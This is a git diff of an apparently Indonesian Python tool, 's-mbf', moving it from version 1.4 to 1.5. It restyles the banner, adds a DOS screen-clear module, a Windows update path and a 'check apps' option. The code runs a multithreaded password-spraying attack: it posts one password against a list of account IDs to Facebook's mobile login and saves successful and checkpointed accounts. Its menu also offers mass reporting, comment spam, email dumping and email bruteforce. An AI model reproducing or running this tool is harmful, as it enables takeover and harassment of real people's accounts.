@@ -4,6 +4,8 @@
 #github: github.com/kang-newbie
 try:
 	from multiprocessing.pool import ThreadPool
+	from crayons import *
+	from src import DOS
 	import os, requests, sys, json, time, hashlib, random, shutil
 except Exception as F:
 	exit("[ModuleErr] %s"%(F))
@@ -16,27 +18,21 @@ try:
 	shutil.rmtree("src/__pycache__")
 except: pass
 
-#color
-r="\033[91m"
-g="\033[92m"
-w="\033[97m"
-c="\033[96m"
-y="\033[93m"
 #banner
-banner=("""%s
-   _____ __  ______  ____
-  / __(_)  |/  / _ )/ __/ %sAuthor : KANG-NEWBIE%s
- _\ \/ / /|_/ / _  / _/	  %sContact: t.me/kang_nuubi%s
-/___/_/_/  /_/____/_/     %sversion: %s1.4%s"""%(c,g,c,g,c,g,c,w))
+def banner():
+	print(cyan('   _____ __  ______  ____',bold=True))
+	print(cyan('  / __(_)  |/  / _ )/ __/ ',bold=True),green('Author : KANG-NEWBIE',bold=True))
+	print(cyan(' _\ \/ / /|_/ / _  / _/	  ',bold=True),green('Contact: t.me/kang_nuubi',bold=True))
+	print(cyan('/___/_/_/  /_/____/_/     ',bold=True),green('version:',bold=True),cyan('1.5',bold=True))
 
 try:
 	toket=open('toket/token.txt')
 	toket.close()
 except IOError:
 		try:
-			os.system('clear')
+			DOS.Dos()
 
-			print(banner)
+			banner()
 			try:
 				os.mkdir('toket')
 			except OSError: pass
@@ -62,7 +58,7 @@ except IOError:
 			exit("[Error] %s"%(F))
 
 def getFid():
-	print(banner)
+	banner()
 	try:
 		os.mkdir('dump')
 	except OSError: pass
@@ -85,7 +81,7 @@ def getFid():
 		exit('[!] failed to fetch friend id')
 
 def getGid():
-	print(banner)
+	banner()
 	try:
 		os.mkdir('dump')
 	except OSError: pass
@@ -135,9 +131,13 @@ def rmtoken():
 
 def update():
 	print("[!] updating...")
-	os.system('cd;rm -rf s-mbf')
-	os.system('cd;git clone https://github.com/KANG-NEWBIE/s-mbf')
-	exit()
+	if os.name in ['nt','win32']:
+		os.system('cd .. & del s-mbf')
+		os.system('cd .. & git clone https://github.com/KANG-NEWBIE/s-mbf')
+	else:
+		os.system('cd;rm -rf s-mbf')
+		os.system('cd;git clone https://github.com/KANG-NEWBIE/s-mbf')
+		exit()
 
 cek=[]
 tap=[]
@@ -146,8 +146,8 @@ def main(arg):
         try:
                 url='https://mbasic.facebook.com/login'
                 dt={'email':arg,'pass':pas,'login':'submit'}
-                #head={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}
-                req=requests.post(url,data=dt)#,headers=head)
+#                head={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}
+                req=requests.post(url,data=dt)
                 respData = req.content
                 if 'save-device' in str(respData) or 'm_sess' in str(respData):
                         true='yeah'
@@ -174,26 +174,27 @@ def main(arg):
                         f.write(wrt)
                         f.close()
                 crk.append(arg)
-                print("\r%s[%scrack%s]%s >>  %s/%s  F[%s] CP[%s] <<  "%(c,r,c,w,len(crk),len(o),len(tap),len(cek)),end=''),;sys.stdout.flush()
+                print("\r[ CRACK ] >> %s/%s F[%s] CP[%s] <<    "%(len(crk),len(o),len(tap),len(cek)),end=''),;sys.stdout.flush()
         except: pass
 
-os.system('clear')
-print(banner)
+DOS.Dos()
+banner()
 try:
 	toket=open('toket/token.txt','r').read()
 	nam=requests.get('https://graph.facebook.com/me/?access_token='+toket)
 	name=nam.json()['name']
 
+	upver='v.1.6'
 	requp=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
-	if 'v.1.5' in str(requp):
-		print('\n%sNew version available update your s-mbf now!%s'%(y,w))
+	if upver in str(requp):
+		print(yellow('\nNew version available. update your s-mbf now!'))
 except KeyError:
 	print("\n[Warning] access token invalid. type '5' to remove access token")
 except requests.exceptions.RequestException:
 	exit("\n[Err] Check your internet connection")
 try:
-	print("""\t[ Welcome %s%s%s ]
-
+	print(white('\t[ Welcome'),yellow(name,bold=True),white(']'))
+	print("""
 [01]> Simple multi bruteforce facebook
 [02]> Dump id from your friends
 [03]> Dump id from your group
@@ -212,88 +213,108 @@ try:
 [16]> Auto posting status
 [17]> Mass Auto Report
 [18]> Facebook dump email
-[19]> Multi bruteforce EMAIL (BETA)
-[00]> Check update"""%(y,name,w))
+[19]> Facebook check apps
+[20]> Multi bruteforce EMAIL (BETA)
+[00]> Check update""")
 except (KeyError,NameError): pass
 
 pilih=int(input('\n[#] kang-newbie/> '))
 if pilih == 2:
-	os.system('clear')
+	DOS.Dos()
 	getFid()
 elif pilih == 3:
-	os.system('clear')
+	DOS.Dos()
 	getGid()
 elif pilih == 4:
-	os.system('python3 src/DumpS.py')
+	DOS.Dos()
+	import src.DumpS
 	exit()
 elif pilih == 5:
 	rmtoken()
 elif pilih == 6:
+	DOS.Dos()
 	import src.komen
 	exit()
 elif pilih == 7:
+	DOS.Dos()
 	import src.Gkomen
 	exit()
 elif pilih == 8:
+	DOS.Dos()
 	import src.Tkomen
 	exit()
 elif pilih == 9:
+	DOS.Dos()
 	import src.Kreact
 	exit()
 elif pilih == 10:
+	DOS.Dos()
 	import src.Facc
 	exit()
 elif pilih == 11:
+	DOS.Dos()
 	import src.Fadd
 	exit()
 elif pilih == 12:
+	DOS.Dos()
 	import src.Unf
 	exit()
 elif pilih == 13:
 	input("[info] before use this module you must have a lot accounts [press enter to continue]")
+	DOS.Dos()
 	import src.Mreact
 	exit()
 elif pilih == 14:
 	input("[Info] before use this module you must have a lot accounts [press enter]")
+	DOS.Dos()
 	import src.Asubs
 	exit()
 elif pilih == 15:
+	DOS.Dos()
 	import src.Cspam
 	exit()
 elif pilih == 16:
+	DOS.Dos()
 	import src.Apost
 	exit()
 elif pilih == 17:
+	DOS.Dos()
 	import src.Mreport
 	exit()
 elif pilih == 18:
+	DOS.Dos()
 	import src.Edump
 	exit()
 elif pilih == 19:
+	DOS.Dos()
+	import src.Capp
+	exit()
+elif pilih == 20:
+	DOS.Dos()
 	import src.Ebrute
 	exit()
 elif pilih == 0:
 	print("\n[!] Checking update")
 	rr=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
-	if 'v.1.5' in str(rr):
+	if upver in str(rr):
 		update()
 	else: exit("[!] already up to date")
 else:
-	os.system('clear')
-	print(banner)
+	DOS.Dos()
+	banner()
 
 try:
         file=open(input("\n[in] Id List Target: ")).read().splitlines()
         pas=input("[in] Password to Crack: ")
 except (KeyboardInterrupt,EOFError):
-        exit("%s\n[!] Key interrupt: Exiting."%(r))
+        exit(red("\n[!] Key interrupt: Exiting."))
 except FileNotFoundError:
-        exit("%s\n[!] File not found: Exiting."%(r))
+        exit(red("\n[!] File not found: Exiting."))
 
 o=[]
 for x in file:
     o.append(x)
-print('\n%s[ Cracking %s%s%s Account With Password %s%s%s ]'%(c,g,len(o),c,y,pas,c))
+print(cyan('\n[ Cracking',bold=True),green(len(o),bold=True),cyan('ID With Password',bold=True),yellow(pas,bold=True),cyan(']',bold=True))
 p=ThreadPool(50)
 next=p.map(main,o)
 
@@ -301,7 +322,7 @@ if len(file) == 0:
 	exit("%s[!] File empty\n"%(r))
 if 'yeah' in str(tap) or 'notbad' in str(cek):
         print("\nFound ["+str(len(tap))+"] CheckPoint ["+str(len(cek))+"]")
-else: print("\n[ %s:(%s ] nothing found"%(y,w))
+else: print(f"\n[ {yellow(':(',bold=True)} ] nothing found")
 if len(tap) > 0:
 	print("found result saved: result/found.txt")
 if len(cek) > 0:
